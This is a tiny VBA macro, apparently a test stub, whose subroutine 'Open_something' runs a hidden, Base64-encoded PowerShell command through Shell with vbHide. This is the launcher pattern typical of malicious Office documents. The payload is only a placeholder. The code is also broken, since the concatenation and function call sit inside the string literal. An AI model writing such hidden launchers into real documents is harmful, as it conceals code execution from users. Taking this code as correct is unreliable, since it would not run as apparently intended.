Sub Open_something()

Dim cmd As String

cmd = "powershell.exe -w hidden -enc & Base64EncodedTestCommand()"
Shell cmd, vbHide

End Sub
